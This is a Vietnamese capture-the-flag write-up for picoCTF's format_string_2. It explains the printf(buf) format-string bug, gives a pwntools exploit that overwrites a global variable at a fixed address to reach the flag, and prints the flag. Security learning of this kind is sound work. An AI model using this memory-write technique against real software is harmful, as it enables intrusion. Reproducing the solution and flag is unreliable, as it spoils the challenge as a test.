# Format_string_2
Giống như các bài `format_string` trước đó, ở challenge này ta cũng có 2 file, một file binary `vuln` và file .c `vuln.c`.

Mở file `vuln.c` ra ta có source code của challenge này như sau:

``` c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

Như tên của challenge `format_string` thì ta thấy đoạn code của chương trình này có một lỗi `format_string` ở dòng:

``` c
printf(buf);
```

Nhìn xuống một xíu thì ta thấy cách để lấy flag của challenge này:

``` c
if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
}
```

Mục tiêu của chúng ta bây giờ sẽ là làm cho biến `sus` từ `0x21737573` thành `0x67616c66`.

Dùng lệnh `checksec` để kiểm tra các cơ chế bảo mật được bật trong file binary, ta thấy PIE không được bật $=>$ các địa chỉ của hàm, biến của chương trình là cố định. Vậy thì địa chỉ biến `sus` sẽ cố định, không thay đổi nên có thể dễ dàng ghi đè.

![image](https://github.com/user-attachments/assets/a609843c-f862-4a2e-99c2-eb27cca1917b)

Tìm hiểu đôi chút cùng ChatGPT, tôi đã được biết rằng trong thư viện `pwntools`, class `FmtStr` có một tính năng là tự động dò tìm offset của format-string. 

`FmtStr` sẽ tự động gửi payload thử nghiệm, dựa trên phản hồi từ server, tìm ra offset phù hợp mà ta có thể dùng để viết giá trị lên các địa chỉ mong muốn. Khi khởi tạo `FmtStr(exec_fmt)`, pwntools sẽ gọi hàm `exec_fmt` nhiều lần với các payload khác nhau để tìm offset.

Xem chi tiết hơn về chức năng này của `FmtStr` tại đây: [LINK](https://docs.pwntools.com/en/stable/fmtstr.html)

Giờ ta chỉ cần sử dụng tính năng này vào việc ghi đè địa chỉ `0x404060` (biến `sus`) với giá trị là `0x67616c66`.

Từ những phân tích trên, ta có file exploit như sau:

``` python 
from pwn import *

context.log_level = "debug"
context.binary = ELF('./vuln')
p = remote('rhea.picoctf.net', 52725)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 52725)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)
p.interactive()
```

Và ta có flag:

``` 
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}
```
